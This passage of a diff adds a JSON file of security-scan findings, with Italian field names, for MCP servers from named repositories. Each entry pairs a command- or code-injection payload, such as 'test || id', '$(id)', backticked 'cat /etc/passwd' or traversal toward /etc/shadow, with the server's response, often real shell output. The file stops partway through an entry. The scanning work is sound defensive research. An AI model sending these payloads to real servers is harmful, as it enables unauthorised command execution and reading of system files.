@@ -1,0 +1,512 @@
+[
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "PierreDillard/mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 29, 'method': 'tools/call', 'params': {'name': 'get_filter_help', 'arguments': {'filter': 'test || id'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),113(docker),988(ollama)\\n'}]}, 'jsonrpc': '2.0', 'id': 29}"
+  },
+  "n": 1
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "storypixel/mcp-taskwarrior-ai",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "mcp-taskwarrior-ai",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 29, 'method': 'tools/call', 'params': {'name': 'task_raw', 'arguments': {'command': 'test || id'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),988(ollama)\\n'}]}, 'jsonrpc': '2.0', 'id': 29}"
+  },
+  "n": 2
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "mjrestivo16/mcp-kubernetes",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "mcp-kubernetes",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 137, 'method': 'tools/call', 'params': {'name': 'k8s_list_pods', 'arguments': {'namespace': 'test || id'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),113(docker),988(ollama)\\n'}]}, 'jsonrpc': '2.0', 'id': 137}"
+  },
+  "n": 3
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "JeremyProffitt/go-mcp-commander",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "main.go",
+   "server_name": "go-mcp-commander",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 11, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': 'test || id'}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 11, 'result': {'content': [{'type': 'text', 'text': '{\\n  \"duration\": \"2.435525ms\",\\n  \"exit_code\": 0,\\n  \"stderr\": \"\",\\n  \"stdout\": \"uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),113(docker),988(ollama)\\\\n\"\\n}'}]}}"
+  },
+  "n": 4
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "rookiejefren/autocoding-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "autocoding-mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 8, 'method': 'tools/call', 'params': {'name': 'run_tests', 'arguments': {'command': '$(id)'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': '{\\n  \"sessionId\": \"994e8822-4022-4768-9cee-36709bb83223\",\\n  \"status\": \"failed\",\\n  \"command\": \"$(id)\",\\n  \"exitCode\": 127,\\n  \"stdout\": \"\",\\n  \"stderr\": \"/bin/sh: 1: uid=1000(tecnico): not found\\\\n\"\\n}'}], 'structuredContent': {'sessionId': '994e8822-4022-4768-9cee-36709bb83223', 'status': 'failed', 'command': '$(id)', 'exitCode': 127, 'stdout': '', 'stderr': '/bin/sh: 1: uid=1000(tecnico): not found\\n'}}, 'jsonrpc': '2.0', 'id': 8}"
+  },
+  "n": 5
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "mjrestivo16/mcp-kubernetes",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "mcp-kubernetes",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 65, 'method': 'tools/call', 'params': {'name': 'k8s_describe_node', 'arguments': {'name': 'test || id'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),113(docker),988(ollama)\\n'}]}, 'jsonrpc': '2.0', 'id': 65}"
+  },
+  "n": 6
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "rangta10/kali-mcp-server",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "server.js",
+   "server_name": "kali-mcp-server",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 11, 'method': 'tools/call', 'params': {'name': 'nmap_scan', 'arguments': {'target': 'test || id'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),988(ollama)\\n'}]}, 'jsonrpc': '2.0', 'id': 11}"
+  },
+  "n": 7
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "MrGNSS/ClaudeDesktopCommander",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "ClaudeDesktopCommander",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 11, 'method': 'tools/call', 'params': {'name': 'execute_command', 'arguments': {'command': 'test || id'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Command started with PID 465495\\nInitial output:\\nuid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),113(docker),988(ollama)\\n'}]}, 'jsonrpc': '2.0', 'id': 11}"
+  },
+  "n": 8
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "local-devops-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "local-devops-mcp__npx",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 152, 'method': 'tools/call', 'params': {'name': 'system_logs', 'arguments': {'logFile': '$(id)'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': \"Error reading system logs: Command failed: tail -n 50 $(id)\\ntail: cannot open 'uid=1000(tecnico)' for reading: No such file or directory\\ntail: cannot open 'gid=1000(tecnico)' for reading: No such file or directory\\ntail: cannot open 'groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),988(ollama)' for reading: No such file or directory\\n\"}], 'isError': True}, 'jsonrpc': '2.0', 'id': 152}"
+  },
+  "n": 9
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "trickv/claude-squared-code",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "src/index.js",
+   "server_name": "claude-squared-code",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 8, 'method': 'tools/call', 'params': {'name': 'execute_claude_code_command', 'arguments': {'command': '$(id)'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Command executed in /home/tecnico/Desktop/Pipeline/tool_mcp_guard_w2/claude-squared-code\\nOutput: Simulating Claude Code execution of: uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),988(ollama)\\n\\nError: \\nExit code: 0'}]}, 'jsonrpc': '2.0', 'id': 8}"
+  },
+  "n": 10
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "Shreesha4994/sap-btp-cf-mcp-server",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "sap-btp-cf-mcp-server",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 65, 'method': 'tools/call', 'params': {'name': 'cf_push', 'arguments': {'appName': 'test || id'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),988(ollama)'}]}, 'jsonrpc': '2.0', 'id': 65}"
+  },
+  "n": 11
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "lox/tmux-mcp-server",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "cmd/tmux-mcp-server/main.go",
+   "server_name": "tmux-mcp-server",
+   "severity": "medium",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output, Sensitive information disclosed: passwd:",
+   "payload": "{'jsonrpc': '2.0', 'id': 40, 'method': 'tools/call', 'params': {'name': 'list_sessions', 'arguments': {'input': '....//....//etc/shadow'}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 40, 'result': {'content': [{'type': 'text', 'text': \"$(id): 1 windows (created Sun Jul 12 13:00:18 2026)\\n$(id)-MCP: 1 windows (created Mon Jul 13 04:45:32 2026)\\n1 UNION SELECT * FROM information_schema_tables; --: 1 windows (created Sun Jul 12 13:00:18 2026)\\n1 UNION SELECT * FROM information_schema_tables; ---MCP: 1 windows (created Mon Jul 13 04:45:33 2026)\\nC_\\\\\\\\Windows\\\\\\\\System32\\\\\\\\config\\\\\\\\SAM: 1 windows (created Sun Jul 12 13:00:18 2026)\\nC_\\\\\\\\Windows\\\\\\\\System32\\\\\\\\config\\\\\\\\SAM-MCP: 1 windows (created Mon Jul 13 04:45:32 2026)\\n__/__/__/etc/passwd: 1 windows (created Sun Jul 12 13:00:18 2026)\\n__/__/__/etc/passwd-MCP: 1 windows (created Mon Jul 13 04:45:32 2026)\\n____//____//etc/shadow: 1 windows (created Sun Jul 12 13:00:18 2026)\\n____//____//etc/shadow-MCP: 1 windows (created Mon Jul 13 04:45:32 2026)\\n__import__('os')_system('id'): 1 windows (cr"
+  },
+  "n": 12
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "eddyv73/azure-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "azure-mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 11, 'method': 'tools/call', 'params': {'name': 'az_execute', 'arguments': {'command': 'test || id'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),988(ollama)\\n'}]}, 'jsonrpc': '2.0', 'id': 11}"
+  },
+  "n": 13
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "RinardNick/mcp-terminal",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "mcp-terminal",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 11, 'method': 'tools/call', 'params': {'name': 'run_command', 'arguments': {'command': 'test || id'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': '{\\n  \"exitCode\": 0,\\n  \"stdout\": \"uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),113(docker),988(ollama)\\\\n\",\\n  \"stderr\": \"\",\\n  \"startTime\": \"2026-07-11T03:29:54.922Z\",\\n  \"endTime\": \"2026-07-11T03:29:54.926Z\"\\n}'}]}, 'jsonrpc': '2.0', 'id': 11}"
+  },
+  "n": 14
+ },
+ {
+  "sotto_categoria": "guard/command-injection-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "manalejandro/mcp-proc",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/cli.js",
+   "server_name": "mcp-proc",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command injection payload returned shell output",
+   "payload": "{'jsonrpc': '2.0', 'id': 173, 'method': 'tools/call', 'params': {'name': 'read_sysctl', 'arguments': {'key': 'test || id'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': '{\\n  \"key\": \"test || id\",\\n  \"value\": \"uid=1000(tecnico) gid=1000(tecnico) groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),988(ollama)\",\\n  \"writable\": false\\n}'}]}, 'jsonrpc': '2.0', 'id': 173}"
+  },
+  "n": 15
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "suvarchal/docker-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "docker-mcp",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 49, 'method': 'tools/call', 'params': {'name': 'run_container', 'arguments': {'image': \"require('child_process').execSync('id').toString()\"}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 49, 'error': {'code': -32603, 'message': 'MCP error -32603: Error executing Docker command: Command failed: docker run require(\\'child_process\\').execSync(\\'id\\').toString()\\n/bin/sh: 1: Syntax error: \"(\" unexpected\\n'}}"
+  },
+  "n": 16
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "nm-mcp-ollama",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "nm-mcp-ollama__npx",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 30, 'method': 'tools/call', 'params': {'name': 'create', 'arguments': {'modelfile': 'test', 'name': \"__import__('os').system('id')\"}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 30, 'error': {'code': -32603, 'message': 'MCP error -32603: Failed to create model: Command failed: ollama create __import__(\\'os\\').system(\\'id\\') -f test\\n/bin/sh: 1: Syntax error: \"(\" unexpected\\n'}}"
+  },
+  "n": 17
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "agentics-ai/code-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/src/index.js",
+   "server_name": "code-mcp",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 275, 'method': 'tools/call', 'params': {'name': 'run_command', 'arguments': {'command': '/etc/passwd'}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 275, 'error': {'code': -32603, 'message': 'MCP error -32603: Tool execution failed: Command failed: /etc/passwd\\n/bin/sh: 1: /etc/passwd: Permission denied\\n'}}"
+  },
+  "n": 18
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "nm-mcp-ollama",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "nm-mcp-ollama__npx",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 31, 'method': 'tools/call', 'params': {'name': 'create', 'arguments': {'modelfile': 'test', 'name': \"require('child_process').execSync('id').toString()\"}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 31, 'error': {'code': -32603, 'message': 'MCP error -32603: Failed to create model: Command failed: ollama create require(\\'child_process\\').execSync(\\'id\\').toString() -f test\\n/bin/sh: 1: Syntax error: \"(\" unexpected\\n'}}"
+  },
+  "n": 19
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "@iflow-mcp/ollama-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "_iflow-mcp_ollama-mcp__npx",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 30, 'method': 'tools/call', 'params': {'name': 'create', 'arguments': {'modelfile': 'test', 'name': \"__import__('os').system('id')\"}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 30, 'error': {'code': -32603, 'message': 'MCP error -32603: Failed to create model: Command failed: ollama create __import__(\\'os\\').system(\\'id\\') -f test\\n/bin/sh: 1: Syntax error: \"(\" unexpected\\n'}}"
+  },
+  "n": 20
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "kazuph/mcp-docs-rag",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "mcp-docs-rag",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 49, 'method': 'tools/call', 'params': {'name': 'add_git_repository', 'arguments': {'repository_url': \"require('child_process').execSync('id').toString()\"}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 49, 'error': {'code': 2, 'message': 'Command failed: cd \"/home/tecnico/gsafe/w1/home/docs\" && git clone require(\\'child_process\\').execSync(\\'id\\').toString()\\n/bin/sh: 1: Syntax error: \"(\" unexpected\\n'}}"
+  },
+  "n": 21
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "@iflow-mcp/ollama-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "_iflow-mcp_ollama-mcp__npx",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 31, 'method': 'tools/call', 'params': {'name': 'create', 'arguments': {'modelfile': 'test', 'name': \"require('child_process').execSync('id').toString()\"}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 31, 'error': {'code': -32603, 'message': 'MCP error -32603: Failed to create model: Command failed: ollama create require(\\'child_process\\').execSync(\\'id\\').toString() -f test\\n/bin/sh: 1: Syntax error: \"(\" unexpected\\n'}}"
+  },
+  "n": 22
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "rudiarta/ask-ai-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "index.js",
+   "server_name": "ask-ai-mcp",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 44, 'method': 'tools/call', 'params': {'name': 'ask_gemini_with_file', 'arguments': {'prompt': 'test', 'file_path': '$(id)'}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 44, 'error': {'code': -32603, 'message': \"Failed to call Gemini: /bin/sh: 1: gemini: not found\\ncat: 'uid=1000(tecnico)': No such file or directory\\ncat: 'gid=1000(tecnico)': No such file or directory\\ncat: 'groups=1000(tecnico),4(adm),24(cdrom),27(sudo),30(dip),105(lxd),988(ollama)': No such file or directory\\n\"}}"
+  },
+  "n": 23
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "suvarchal/docker-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "docker-mcp",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 48, 'method': 'tools/call', 'params': {'name': 'run_container', 'arguments': {'image': \"__import__('os').system('id')\"}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 48, 'error': {'code': -32603, 'message': 'MCP error -32603: Error executing Docker command: Command failed: docker run __import__(\\'os\\').system(\\'id\\')\\n/bin/sh: 1: Syntax error: \"(\" unexpected\\n'}}"
+  },
+  "n": 24
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "kazuph/mcp-docs-rag",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "build/index.js",
+   "server_name": "mcp-docs-rag",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 48, 'method': 'tools/call', 'params': {'name': 'add_git_repository', 'arguments': {'repository_url': \"__import__('os').system('id')\"}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 48, 'error': {'code': 2, 'message': 'Command failed: cd \"/home/tecnico/gsafe/w1/home/docs\" && git clone __import__(\\'os\\').system(\\'id\\')\\n/bin/sh: 1: Syntax error: \"(\" unexpected\\n'}}"
+  },
+  "n": 25
+ },
+ {
+  "sotto_categoria": "guard/command-execution-fuzzing",
+  "categoria_madre": "Command injection",
+  "repo": "agentics-ai/code-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/src/index.js",
+   "server_name": "code-mcp",
+   "severity": "high",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Command execution attempt detected",
+   "payload": "{'jsonrpc': '2.0', 'id': 279, 'method': 'tools/call', 'params': {'name': 'run_command', 'arguments': {'command': '`cat /etc/passwd`'}}}",
+   "response": "{'jsonrpc': '2.0', 'id': 279, 'error': {'code': -32603, 'message': 'MCP error -32603: Tool execution failed: Command failed: `cat /etc/passwd`\\n/bin/sh: 1: root:x:0:0:root:/root:/bin/bash: not found\\n'}}"
+  },
+  "n": 26
+ },
+ {
+  "sotto_categoria": "guard/code-injection-fuzzing",
+  "categoria_madre": "Code injection",
+  "repo": "mcpc-tech/docsmith-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "./dist/index.js",
+   "server_name": "docsmith-mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload was executed by server",
+   "payload": "{'jsonrpc': '2.0', 'id': 58, 'method': 'tools/call', 'params': {'name': 'run_python', 'arguments': {'code': '....//....//etc/shadow'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Error: Traceback (most recent call last):\\n  File \"/lib/python313.zip/_pyodide/_base.py\", line 523, in eval_code\\n    .run(globals, locals)\\n     ~~~^^^^^^^^^^^^^^^^^\\n  File \"/lib/python313.zip/_pyodide/_base.py\", line 357, in run\\n    coroutine = eval(self.code, globals, locals)\\n  File \"<exec>\", line 1, in <module>\\n  File \"<string>\", line 1\\n    ....//....//etc/shadow\\n        ^^\\nSyntaxError: invalid syntax\\n\\n\\n**Syntax Error Detected!** This often happens when Python code is not properly escaped for JSON transmission.\\n\\n**Tips:**\\n- Avoid using triple quotes (``` or ```python)\\n- Use single quotes for strings: `\\'hello\\'` instead of `\"hello\"`\\n- For multi-line strings, concatenate: `\\'line1\\' + \\'\\\\n\\' + \\'line2\\'`\\n- Avoid backticks (`) and dollar signs ($) in code'}], 'isError': True}, 'jsonrpc': '2.0', 'id': 58}"
+  },
+  "n": 27
+ },
+ {
+  "sotto_categoria": "guard/code-injection-fuzzing",
+  "categoria_madre": "Code injection",
+  "repo": "yikaj/futu",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "futu",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload was executed by server",
+   "payload": "{'jsonrpc': '2.0', 'id': 44, 'method': 'tools/call', 'params': {'name': 'request_trading_days', 'arguments': {'market': '$(id)'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': '获取交易日历失败: 命令执行失败: Command failed: python \"/home/tecnico/gsafe/w2/work/Pipeline/tool_mcp_guard_w2/futu/scripts/request_trading_days.py\" --market \"$(id)\"\\nTraceback (most recent call last):\\n  File \"/home/tecnico/gsafe/w2/work/Pipeline/tool_mcp_guard_w2/futu/scripts/request_trading_days.py\", line 2, in <module>\\n    from futu import TradeDateMarket, RET_OK\\nModuleNotFoundError: No module named \\'futu\\'\\n'}]}, 'jsonrpc': '2.0', 'id': 44}"
+  },
+  "n": 28
+ },
+ {
+  "sotto_categoria": "guard/code-injection-fuzzing",
+  "categoria_madre": "Code injection",
+  "repo": "mcpc-tech/docsmith-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "./dist/index.js",
+   "server_name": "docsmith-mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload was executed by server",
+   "payload": "{'jsonrpc': '2.0', 'id': 57, 'method': 'tools/call', 'params': {'name': 'run_python', 'arguments': {'code': '../../../etc/passwd'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': 'Error: Error: Traceback (most recent call last):\\n  File \"/lib/python313.zip/_pyodide/_base.py\", line 523, in eval_code\\n    .run(globals, locals)\\n     ~~~^^^^^^^^^^^^^^^^^\\n  File \"/lib/python313.zip/_pyodide/_base.py\", line 357, in run\\n    coroutine = eval(self.code, globals, locals)\\n  File \"<exec>\", line 1, in <module>\\n  File \"<string>\", line 1\\n    ../../../etc/passwd\\n    ^\\nSyntaxError: invalid syntax\\n\\n\\n**Syntax Error Detected!** This often happens when Python code is not properly escaped for JSON transmission.\\n\\n**Tips:**\\n- Avoid using triple quotes (``` or ```python)\\n- Use single quotes for strings: `\\'hello\\'` instead of `\"hello\"`\\n- For multi-line strings, concatenate: `\\'line1\\' + \\'\\\\n\\' + \\'line2\\'`\\n- Avoid backticks (`) and dollar signs ($) in code'}], 'isError': True}, 'jsonrpc': '2.0', 'id': 57}"
+  },
+  "n": 29
+ },
+ {
+  "sotto_categoria": "guard/code-injection-fuzzing",
+  "categoria_madre": "Code injection",
+  "repo": "yikaj/futu",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "futu",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload was executed by server",
+   "payload": "{'jsonrpc': '2.0', 'id': 26, 'method': 'tools/call', 'params': {'name': 'request_history_kline', 'arguments': {'code': '$(id)'}}}",
+   "response": "{'result': {'content': [{'type': 'text', 'text': '获取历史K线数据失败: 命令执行失败: Command failed: python \"/home/tecnico/gsafe/w2/work/Pipeline/tool_mcp_guard_w2/futu/scripts/request_history_kline.py\" --code \"$(id)\"\\nTraceback (most recent call last):\\n  File \"/home/tecnico/gsafe/w2/work/Pipeline/tool_mcp_guard_w2/futu/scripts/request_history_kline.py\", line 2, in <module>\\n    from futu import KLType, AuType, KL_FIELD\\nModuleNotFoundError: No module named \\'futu\\'\\n'}]}, 'jsonrpc': '2.0', 'id': 26}"
+  },
+  "n": 30
+ },
+ {
+  "sotto_categoria": "guard/code-injection-fuzzing",
+  "categoria_madre": "Code injection",
+  "repo": "alexlock1/macos-mcp",
+  "verdetto_pipeline": "VP",
+  "dati": {
+   "file": "dist/index.js",
+   "server_name": "macos-mcp",
+   "severity": "critical",
+   "description": "Security vulnerability detected during runtime analysis. Method tested: tools/call. Issues found: Code injection payload was executed by server",
+   "payload": "{'jsonrpc': '2.0', 'id': 352, 'method': 'tools/call', 'params': {'name': 'macos_pdf_merge', 'arguments': {'inputPaths': [], 'outputPath': 'test && ls -la /'}}}",
